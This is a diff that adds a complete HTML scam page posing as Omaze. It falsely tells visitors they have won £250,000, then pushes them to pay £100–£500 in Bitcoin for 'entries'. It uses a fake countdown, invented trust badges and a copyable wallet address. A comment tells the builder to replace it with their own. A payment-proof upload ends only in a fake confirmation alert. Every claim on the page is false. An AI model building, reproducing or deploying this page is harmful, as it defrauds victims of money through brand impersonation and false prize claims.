@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Omaze — Win £250,000</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: #f2f2f2; overflow-x: hidden; }
+
+    /* PAGE SYSTEM */
+    .page { display: none; min-height: 100vh; }
+    .page.active { display: block; }
+
+    /* ================================
+       SHARED: OMAZE HEADER
+    ================================ */
+    .top-bar {
+      background: #0b2b27;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .omaze-logo {
+      display: flex; align-items: center; gap: 9px;
+    }
+    .omaze-logo svg { width: 34px; height: 34px; }
+    .omaze-logo-text { color: white; font-size: 1.6rem; font-weight: 700; letter-spacing: 0.5px; }
+
+    /* ================================
+       PAGE 1 — HOME
+    ================================ */
+    /* HERO */
+    .home-hero {
+      background: linear-gradient(160deg, #061c18 0%, #0b2b27 50%, #0f3530 100%);
+      padding: 0 0 0;
+      position: relative;
+      overflow: hidden;
+      text-align: center;
+    }
+    /* Confetti dots */
+    .home-hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image:
+        radial-gradient(circle, #f5c800 1px, transparent 1px),
+        radial-gradient(circle, #f5c800 1.5px, transparent 1.5px),
+        radial-gradient(circle, rgba(255,255,255,0.3) 1px, transparent 1px);
+      background-size: 60px 60px, 80px 80px, 100px 100px;
+      background-position: 10px 10px, 40px 30px, 20px 50px;
+      opacity: 0.25;
+      pointer-events: none;
+    }
+
+    .home-hero-inner {
+      position: relative;
+      z-index: 1;
+      padding: 36px 24px 0;
+    }
+
+    .hero-eyebrow {
+      color: rgba(255,255,255,0.6);
+      font-size: 0.78rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 16px;
+    }
+    .hero-h1 {
+      font-size: clamp(2.4rem, 10vw, 4rem);
+      font-weight: 900;
+      line-height: 1.0;
+      color: white;
+      text-transform: uppercase;
+      margin-bottom: 0;
+    }
+    .hero-h1 span {
+      color: #f5c800;
+      display: block;
+    }
+
+    /* Prize image placeholder */
+    .prize-img {
+      width: 100%;
+      max-width: 420px;
+      margin: 24px auto 0;
+      display: block;
+      border-radius: 20px 20px 0 0;
+      overflow: hidden;
+      position: relative;
+    }
+    .prize-img-inner {
+      width: 100%;
+      height: 220px;
+      background: linear-gradient(135deg, #1a4a3a 0%, #0d2b20 40%, #1a3a2a 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+    .prize-img-inner::after {
+      content: '';
+      position: absolute;
+      width: 200px; height: 200px;
+      background: radial-gradient(circle, rgba(245,200,0,0.15) 0%, transparent 70%);
+      top: 50%; left: 50%; transform: translate(-50%,-50%);
+    }
+    .prize-amount-big {
+      font-size: 3.2rem;
+      font-weight: 900;
+      color: #f5c800;
+      letter-spacing: -1px;
+      position: relative; z-index: 1;
+    }
+    .prize-label {
+      font-size: 0.85rem;
+      color: rgba(255,255,255,0.7);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      position: relative; z-index: 1;
+    }
+    .prize-trophy {
+      font-size: 3rem;
+      position: relative; z-index: 1;
+    }
+
+    /* WAVE */
+    .wave-divider { display: block; line-height: 0; background: #0f3530; }
+    .wave-divider svg { width: 100%; display: block; }
+
+    /* BODY CONTENT */
+    .home-body { background: #f2f2f2; }
+
+    /* Congratulations card */
+    .congrats-card {
+      background: white;
+      margin: 20px 16px;
+      border-radius: 18px;
+      padding: 24px 20px;
+      text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+    }
+    .congrats-sub {
+      color: #777;
+      font-size: 0.85rem;
+      margin-bottom: 8px;
+    }
+    .congrats-text {
+      font-size: 1rem;
+      color: #222;
+      line-height: 1.7;
+    }
+    .congrats-text strong { color: #0b9a76; }
+
+    .btn-claim {
+      display: block;
+      width: 100%;
+      padding: 17px;
+      background: #f5c800;
+      color: #111;
+      font-weight: 800;
+      font-size: 1.05rem;
+      border: none;
+      border-radius: 100px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background 0.15s, transform 0.1s;
+      letter-spacing: 0.2px;
+    }
+    .btn-claim:active { transform: scale(0.97); background: #d4ac00; }
+
+    /* HOW IT WORKS */
+    .section-title {
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 900;
+      color: #111;
+      padding: 28px 20px 16px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .steps-wrap { padding: 0 16px 8px; }
+    .step {
+      background: white;
+      border-radius: 14px;
+      padding: 18px 18px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.06);
+    }
+    .step-num {
+      width: 36px; height: 36px;
+      background: #0b2b27;
+      color: white;
+      font-weight: 800;
+      font-size: 0.9rem;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .step-title { font-weight: 700; font-size: 0.92rem; color: #111; margin-bottom: 3px; }
+    .step-desc { font-size: 0.81rem; color: #666; line-height: 1.5; }
+
+    /* TRUST SECTION */
+    .trust-section {
+      background: #0b2b27;
+      margin: 20px 0 0;
+      padding: 28px 20px;
+      text-align: center;
+    }
+    .trust-title { color: white; font-size: 1rem; font-weight: 800; margin-bottom: 18px; text-transform: uppercase; letter-spacing: 1px; }
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .trust-badge {
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 12px;
+      padding: 12px 16px;
+      text-align: center;
+      min-width: 90px;
+    }
+    .trust-badge-icon { font-size: 1.5rem; margin-bottom: 4px; }
+    .trust-badge-label { color: rgba(255,255,255,0.7); font-size: 0.68rem; font-weight: 600; }
+
+    /* FOOTER */
+    .site-footer {
+      background: #0b2b27;
+      border-top: 1px solid rgba(255,255,255,0.08);
+      padding: 28px 20px 40px;
+      text-align: center;
+    }
+    .footer-links {
+      display: flex; justify-content: center; flex-wrap: wrap;
+      gap: 16px; margin-bottom: 18px;
+    }
+    .footer-links a {
+      color: rgba(255,255,255,0.45);
+      font-size: 0.78rem;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .footer-links a:hover { color: #f5c800; }
+    .footer-legal {
+      color: rgba(255,255,255,0.25);
+      font-size: 0.68rem;
+      line-height: 1.7;
+      max-width: 360px;
+      margin: 0 auto 14px;
+    }
+    .footer-copy { color: rgba(255,255,255,0.2); font-size: 0.68rem; }
+
+    /* ================================
+       PAGE 2 — OFFER PAGE
+    ================================ */
+    .offer-hero {
+      background: linear-gradient(180deg, #0b2b27 0%, #0f3530 100%);
+      padding: 30px 20px 64px;
+      text-align: center;
+      position: relative;
+    }
+    .offer-hero-title {
+      color: white;
+      font-size: 1.35rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      margin-bottom: 6px;
+    }
+    .offer-hero-sub {
+      color: rgba(255,255,255,0.55);
+      font-size: 0.87rem;
+      margin-bottom: 16px;
+    }
+    .cd-text { color: #f5c800; font-size: 1.1rem; font-weight: 700; }
+
+    .offer-wave {
+      position: absolute;
+      bottom: -1px; left: 0; right: 0;
+      line-height: 0;
+    }
+    .offer-wave svg { width: 100%; display: block; }
+
+    .cards-wrap { background: #f2f2f2; padding: 22px 16px 20px; }
+
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 18px 16px 16px;
+      margin-bottom: 14px;
+      position: relative;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.07);
+    }
+    .card-badge {
+      position: absolute;
+      top: 16px; right: 16px;
+      background: #1db89a;
+      color: white;
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 5px 13px;
+      border-radius: 100px;
+    }
+    .card-badge.vip { background: #e67e00; }
+    .card-old { font-size: 0.85rem; color: #999; text-decoration: line-through; margin-bottom: 2px; }
+    .card-price { font-size: 2.5rem; font-weight: 900; color: #111; line-height: 1; margin-bottom: 5px; }
+    .card-entries { font-size: 0.87rem; color: #555; margin-bottom: 14px; }
+
+    .btn-btc {
+      display: block; width: 100%; padding: 15px;
+      background: #f5c800; color: #111;
+      font-weight: 800; font-size: 0.95rem;
+      border: none; border-radius: 100px; cursor: pointer;
+      transition: background 0.15s, transform 0.1s;
+    }
+    .btn-btc:active { transform: scale(0.97); background: #d4ac00; }
+
+    .offer-disclaimer {
+      text-align: center; font-size: 0.71rem; color: #bbb;
+      padding: 4px 24px 40px; line-height: 1.6;
+    }
+
+    /* ================================
+       PAGE 3 — BTC PAYMENT
+    ================================ */
+    #page-payment {
+      background: #121212;
+      min-height: 100vh;
+    }
+    .pay-header {
+      background: #1a1a1a;
+      padding: 18px 18px 16px;
+      display: flex; align-items: center; gap: 12px;
+      border-bottom: 1px solid #242424;
+    }
+    .pay-back {
+      background: #2a2a2a; border: none; border-radius: 10px;
+      width: 36px; height: 36px;
+      display: flex; align-items: center; justify-content: center; cursor: pointer;
+    }
+    .pay-back svg { width: 20px; height: 20px; fill: white; }
+    .pay-header-title { color: white; font-size: 1rem; font-weight: 700; }
+
+    .pay-body { padding: 18px 16px 40px; }
+
+    .pay-row {
+      background: #1e1e1e; border-radius: 14px;
+      padding: 15px 16px; display: flex; align-items: center;
+      gap: 14px; margin-bottom: 11px;
+    }
+    .pay-icon {
+      width: 44px; height: 44px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .pay-icon.red { background: #3a1c1c; }
+    .pay-icon.gold { background: #2e2700; }
+    .pay-icon.red svg { fill: #e05555; width: 22px; height: 22px; }
+    .pay-icon.gold svg { fill: #f5c800; width: 22px; height: 22px; }
+    .pay-row-label { color: rgba(255,255,255,0.38); font-size: 0.74rem; margin-bottom: 2px; }
+    .pay-row-val { color: white; font-size: 1.15rem; font-weight: 700; }
+
+    .pay-info {
+      background: #1e1e1e; border-radius: 14px;
+      padding: 16px 18px; margin-bottom: 20px;
+      text-align: center; color: rgba(255,255,255,0.65);
+      font-size: 0.87rem; line-height: 1.7;
+    }
+    .pay-info strong { color: white; }
+
+    /* REAL BITCOIN LOGO */
+    .btc-wrap { display: flex; justify-content: center; margin-bottom: 22px; }
+    .btc-coin {
+      width: 82px; height: 82px; border-radius: 50%;
+      background: linear-gradient(145deg, #f7931a, #e07b10);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 6px 28px rgba(247,147,26,0.45), inset 0 -3px 8px rgba(0,0,0,0.2);
+      position: relative;
+    }
+    .btc-coin-inner {
+      color: white;
+      font-size: 2.8rem;
+      font-weight: 900;
+      font-family: serif;
+      line-height: 1;
+      margin-left: 3px;
+      /* The ₿ symbol */
+    }
+
+    .addr-title { color: white; font-size: 0.98rem; font-weight: 700; margin-bottom: 10px; }
+    .addr-box {
+      background: #1e1e1e; border-radius: 12px;
+      padding: 13px 13px; display: flex; align-items: center;
+      gap: 10px; margin-bottom: 8px;
+    }
+    .addr-text {
+      font-family: monospace; font-size: 0.76rem;
+      color: rgba(255,255,255,0.8); word-break: break-all;
+      flex: 1; line-height: 1.5;
+    }
+    .copy-btn {
+      background: #f7931a; border: none; border-radius: 9px;
+      width: 36px; height: 36px;
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; flex-shrink: 0; transition: background 0.2s;
+    }
+    .copy-btn:hover { background: #d97b0e; }
+    .copy-btn.copied { background: #27ae60; }
+    .copy-btn svg { width: 18px; height: 18px; fill: white; }
+
+    .network-label { color: rgba(255,255,255,0.32); font-size: 0.77rem; margin-bottom: 20px; }
+    .network-label b { color: rgba(255,255,255,0.58); font-weight: 600; }
+
+    .divider { border: none; border-top: 1px solid #262626; margin-bottom: 20px; }
+
+    .upload-title { color: white; font-size: 0.93rem; font-weight: 700; margin-bottom: 11px; }
+    .file-row { display: flex; align-items: center; gap: 12px; margin-bottom: 6px; }
+    .file-btn {
+      border: 2px solid #f7931a; background: transparent;
+      color: #f7931a; font-weight: 700; font-size: 0.81rem;
+      padding: 8px 17px; border-radius: 9px; cursor: pointer;
+    }
+    .file-name { color: rgba(255,255,255,0.32); font-size: 0.81rem; }
+    .file-hint { font-size: 0.7rem; color: rgba(255,255,255,0.22); margin-bottom: 22px; }
+
+    .submit-btn {
+      width: 100%; padding: 16px;
+      background: linear-gradient(90deg, #c0392b 0%, #1db89a 100%);
+      color: white; font-weight: 800; font-size: 0.98rem;
+      border: none; border-radius: 14px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; margin-bottom: 11px; transition: opacity 0.2s;
+    }
+    .submit-btn:active { opacity: 0.85; }
+    .submit-btn svg { width: 20px; height: 20px; fill: white; }
+
+    .cancel-btn {
+      width: 100%; padding: 14px; background: transparent;
+      border: 1px solid #2e2e2e; color: rgba(255,255,255,0.35);
+      font-size: 0.88rem; font-weight: 600; border-radius: 14px; cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ================================
+     PAGE 1: HOME
+================================= -->
+<div class="page active" id="page-home">
+
+  <!-- Header -->
+  <div class="top-bar">
+    <div class="omaze-logo">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M5 20 C5 11.72 11.72 5 20 5 C28.28 5 35 11.72 35 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M9.5 20 C9.5 14.2 14.2 9.5 20 9.5 C25.8 9.5 30.5 14.2 30.5 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M14.5 20 C14.5 17.0 17.0 14.5 20 14.5 C23.0 14.5 25.5 17.0 25.5 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <circle cx="20" cy="20" r="2.3" fill="white"/>
+      </svg>
+      <span class="omaze-logo-text">omaze</span>
+    </div>
+  </div>
+
+  <!-- Hero -->
+  <div class="home-hero">
+    <div class="home-hero-inner">
+      <div class="hero-eyebrow">🎉 Limited Time Draw</div>
+      <div class="hero-h1">
+        IT'S TIME<br>TO CLAIM
+        <span>YOUR PRIZE</span>
+      </div>
+
+      <!-- Prize placeholder image -->
+      <div class="prize-img">
+        <div class="prize-img-inner">
+          <div class="prize-trophy">🏆</div>
+          <div class="prize-amount-big">£250,000</div>
+          <div class="prize-label">Cash Prize Draw</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="wave-divider">
+      <svg viewBox="0 0 375 42" preserveAspectRatio="none">
+        <path d="M0,0 C120,42 255,42 375,0 L375,42 L0,42 Z" fill="#f2f2f2"/>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Congrats Card -->
+  <div class="home-body">
+    <div class="congrats-card">
+      <div class="congrats-sub">Congratulations 🎊</div>
+      <p class="congrats-text">
+        Great news from Omaze: you've won a <strong>£250,000</strong> prize in the Cornwall House Draw. Congratulations once again! 🥳
+      </p>
+      <button class="btn-claim" onclick="goOffer()">Claim My Prize</button>
+    </div>
+
+    <!-- How it works -->
+    <div class="section-title">How It Works</div>
+    <div class="steps-wrap">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div>
+          <div class="step-title">Choose Your Entry Package</div>
+          <div class="step-desc">Select the entry bundle that suits you. More entries = better chance of winning.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div>
+          <div class="step-title">Pay with Bitcoin</div>
+          <div class="step-desc">Send your payment securely using Bitcoin. Fast, safe and borderless.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div>
+          <div class="step-title">Upload Payment Proof</div>
+          <div class="step-desc">Upload your transaction screenshot as confirmation. Entries confirmed within 30 minutes.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div>
+          <div class="step-title">Wait for the Draw</div>
+          <div class="step-desc">The winner of the £250,000 prize draw will be contacted directly. Good luck!</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Trust -->
+    <div class="trust-section">
+      <div class="trust-title">Why Trust Omaze?</div>
+      <div class="trust-badges">
+        <div class="trust-badge">
+          <div class="trust-badge-icon">🔒</div>
+          <div class="trust-badge-label">Secure<br>Payments</div>
+        </div>
+        <div class="trust-badge">
+          <div class="trust-badge-icon">⭐</div>
+          <div class="trust-badge-label">4.5 Trustpilot<br>Rating</div>
+        </div>
+        <div class="trust-badge">
+          <div class="trust-badge-icon">🌍</div>
+          <div class="trust-badge-label">Global<br>Winners</div>
+        </div>
+        <div class="trust-badge">
+          <div class="trust-badge-icon">✅</div>
+          <div class="trust-badge-label">Verified<br>Draw</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="site-footer">
+      <div class="omaze-logo" style="justify-content:center;margin-bottom:18px;">
+        <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5 20 C5 11.72 11.72 5 20 5 C28.28 5 35 11.72 35 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+          <path d="M9.5 20 C9.5 14.2 14.2 9.5 20 9.5 C25.8 9.5 30.5 14.2 30.5 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+          <path d="M14.5 20 C14.5 17.0 17.0 14.5 20 14.5 C23.0 14.5 25.5 17.0 25.5 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+          <circle cx="20" cy="20" r="2.3" fill="white"/>
+        </svg>
+        <span class="omaze-logo-text">omaze</span>
+      </div>
+      <div class="footer-links">
+        <a href="#">How It Works</a>
+        <a href="#">Terms & Conditions</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Contact Us</a>
+        <a href="#">FAQs</a>
+      </div>
+      <p class="footer-legal">
+        Please note that this prize draw is not a charity raffle or lottery but a prize draw. No purchase is necessary to enter. Entrants must be 18 years or older. The draw will close on 31st May 2026. Full terms and conditions apply.
+      </p>
+      <p class="footer-copy">© 2026 Omaze. All rights reserved.</p>
+    </div>
+  </div>
+
+</div><!-- end page-home -->
+
+
+<!-- ================================
+     PAGE 2: OFFER
+================================= -->
+<div class="page" id="page-offer">
+
+  <!-- Header -->
+  <div class="top-bar">
+    <div class="omaze-logo">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M5 20 C5 11.72 11.72 5 20 5 C28.28 5 35 11.72 35 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M9.5 20 C9.5 14.2 14.2 9.5 20 9.5 C25.8 9.5 30.5 14.2 30.5 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M14.5 20 C14.5 17.0 17.0 14.5 20 14.5 C23.0 14.5 25.5 17.0 25.5 20" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <circle cx="20" cy="20" r="2.3" fill="white"/>
+      </svg>
+      <span class="omaze-logo-text">omaze</span>
+    </div>
+  </div>
+
+  <div class="offer-hero">
+    <div class="offer-hero-title">HERE'S YOUR SPECIAL OFFER</div>
+    <div class="offer-hero-sub">Limited availability — secure your entry below</div>
+    <div class="cd-text" id="cd-display">1d 23h 59m 00s</div>
+    <div class="offer-wave">
+      <svg viewBox="0 0 375 42" preserveAspectRatio="none">
+        <path d="M0,0 C120,42 255,42 375,0 L375,42 L0,42 Z" fill="#f2f2f2"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="cards-wrap">
+
+    <div class="card">
+      <span class="card-badge">Popular</span>
+      <div class="card-old">£200</div>
+      <div class="card-price">£100</div>
+      <div class="card-entries">200 Entries + 200 Bonus Entries</div>
+      <button class="btn-btc" onclick="goPayment('£100')">Buy with Bitcoin</button>
+    </div>
+
+    <div class="card">
+      <span class="card-badge">Best Value</span>
+      <div class="card-old">£400</div>
+      <div class="card-price">£200</div>
+      <div class="card-entries">450 Entries + 450 Bonus Entries</div>
+      <button class="btn-btc" onclick="goPayment('£200')">Buy with Bitcoin</button>
+    </div>
+
+    <div class="card">
+      <span class="card-badge">Premium</span>
+      <div class="card-old">£800</div>
+      <div class="card-price">£400</div>
+      <div class="card-entries">950 Entries + 950 Bonus Entries</div>
+      <button class="btn-btc" onclick="goPayment('£400')">Buy with Bitcoin</button>
+    </div>
+
+    <div class="card">
+      <span class="card-badge vip">VIP</span>
+      <div class="card-old">£1000</div>
+      <div class="card-price">£500</div>
+      <div class="card-entries">1250 Entries + 1250 Bonus Entries</div>
+      <button class="btn-btc" onclick="goPayment('£500')">Buy with Bitcoin</button>
+    </div>
+
+  </div>
+
+  <p class="offer-disclaimer">
+    Secure checkout powered by cryptocurrency.<br>
+    This is an independent promotional page. No purchase necessary to enter.
+  </p>
+
+</div><!-- end page-offer -->
+
+
+<!-- ================================
+     PAGE 3: BTC PAYMENT
+================================= -->
+<div class="page" id="page-payment">
+
+  <div class="pay-header">
+    <button class="pay-back" onclick="goBack()">
+      <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+    </button>
+    <div class="pay-header-title">Bitcoin Payment</div>
+  </div>
+
+  <div class="pay-body">
+
+    <div class="pay-row">
+      <div class="pay-icon red">
+        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+      </div>
+      <div>
+        <div class="pay-row-label">Payment Amount</div>
+        <div class="pay-row-val" id="pay-amount">£100</div>
+      </div>
+    </div>
+
+    <div class="pay-row">
+      <div class="pay-icon gold">
+        <!-- Bitcoin B icon -->
+        <svg viewBox="0 0 24 24" fill="#f5c800">
+          <path d="M14.24 10.56C13.93 11.8 12 11.17 11.4 11L11.95 8.82C12.56 9 14.56 9.26 14.24 10.56M13.1 14.6C12.76 15.95 10.43 15.2 9.7 15L10.31 12.62C11.04 12.82 13.46 13.19 13.1 14.6M16.25 10.12C16.46 8.41 15.08 7.5 13.23 7.13L13.84 4.79L12.37 4.41L11.77 6.7C11.39 6.6 11 6.5 10.61 6.4L11.22 4.08L9.75 3.7L9.14 6.04C8.82 5.96 8.51 5.88 8.2 5.79L8.2 5.78L6.18 5.26L5.78 6.83C5.78 6.83 6.86 7.09 6.83 7.1C7.43 7.26 7.54 7.66 7.52 7.97L6.83 10.59C6.87 10.6 6.92 10.61 6.98 10.64C6.93 10.63 6.88 10.61 6.83 10.6L5.86 14.34C5.79 14.52 5.6 14.79 5.19 14.68C5.2 14.7 4.13 14.4 4.13 14.4L3.42 16.08L5.33 16.57C5.68 16.66 6.03 16.76 6.37 16.85L5.75 19.22L7.22 19.6L7.83 17.25C8.22 17.36 8.6 17.46 8.97 17.56L8.36 19.9L9.83 20.28L10.45 17.92C12.88 18.38 14.7 18.2 15.46 16C16.08 14.17 15.44 13.12 14.13 12.43C15.07 12.21 15.77 11.59 16.25 10.12Z"/>
+        </svg>
+      </div>
+      <div>
+        <div class="pay-row-label">Your payment method</div>
+        <div class="pay-row-val">Bitcoin</div>
+      </div>
+    </div>
+
+    <div class="pay-info">
+      You are to make payment of <strong id="pay-amount2">£100</strong> using your selected payment method.
+    </div>
+
+    <!-- REAL Bitcoin coin logo -->
+    <div class="btc-wrap">
+      <div class="btc-coin">
+        <div class="btc-coin-inner">₿</div>
+      </div>
+    </div>
+
+    <div class="addr-title">Bitcoin Address:</div>
+    <div class="addr-box">
+      <!-- 🔑 REPLACE THIS WITH YOUR REAL BTC WALLET ADDRESS -->
+      <div class="addr-text" id="btc-addr">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+      <button class="copy-btn" id="copy-btn" onclick="copyAddr()">
+        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+      </button>
+    </div>
+    <div class="network-label">Network Type: <b>Bitcoin</b></div>
+
+    <hr class="divider"/>
+
+    <div class="upload-title">Upload Payment proof after payment</div>
+    <div class="file-row">
+      <label class="file-btn" for="proof-file">Choose file</label>
+      <input type="file" id="proof-file" accept=".jpg,.jpeg,.png,.pdf" style="display:none" onchange="setFile(this)"/>
+      <span class="file-name" id="file-name">No file chosen</span>
+    </div>
+    <div class="file-hint">Accepted formats: JPG, PNG, PDF (Max. 5MB)</div>
+
+    <button class="submit-btn" onclick="doSubmit()">
+      <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      Submit Payment
+    </button>
+    <button class="cancel-btn" onclick="goBack()">Cancel</button>
+
+  </div>
+</div><!-- end page-payment -->
+
+
+<script>
+  // COUNTDOWN
+  const end = Date.now() + 86400000 + 82800000 + 3540000;
+  function tick() {
+    const d = end - Date.now();
+    if (d <= 0) { document.getElementById('cd-display').textContent = 'Offer Expired'; return; }
+    const days = Math.floor(d/86400000);
+    const hrs  = Math.floor((d%86400000)/3600000);
+    const mins = Math.floor((d%3600000)/60000);
+    const secs = Math.floor((d%60000)/1000);
+    document.getElementById('cd-display').textContent = `${days}d ${hrs}h ${mins}m ${secs}s`;
+  }
+  tick(); setInterval(tick, 1000);
+
+  // PAGE NAV
+  function goOffer() {
+    document.getElementById('page-home').classList.remove('active');
+    document.getElementById('page-offer').classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  function goPayment(price) {
+    document.getElementById('pay-amount').textContent  = price;
+    document.getElementById('pay-amount2').textContent = price;
+    document.getElementById('copy-btn').classList.remove('copied');
+    document.getElementById('file-name').textContent = 'No file chosen';
+    document.getElementById('proof-file').value = '';
+    document.getElementById('page-offer').classList.remove('active');
+    document.getElementById('page-payment').classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  function goBack() {
+    document.getElementById('page-payment').classList.remove('active');
+    document.getElementById('page-offer').classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  // COPY ADDRESS
+  function copyAddr() {
+    navigator.clipboard.writeText(document.getElementById('btc-addr').textContent).then(() => {
+      const b = document.getElementById('copy-btn');
+      b.classList.add('copied');
+      setTimeout(() => b.classList.remove('copied'), 2500);
+    });
+  }
+
+  // FILE
+  function setFile(inp) {
+    document.getElementById('file-name').textContent = inp.files[0] ? inp.files[0].name : 'No file chosen';
+  }
+
+  // SUBMIT
+  function doSubmit() {
+    if (!document.getElementById('proof-file').files[0]) {
+      alert('Please upload your payment proof first.');
+      return;
+    }
+    alert('✅ Payment submitted!\nYour entries will be confirmed within 30 minutes.');
+    goBack();
+  }
+</script>
+</body>
+</html>
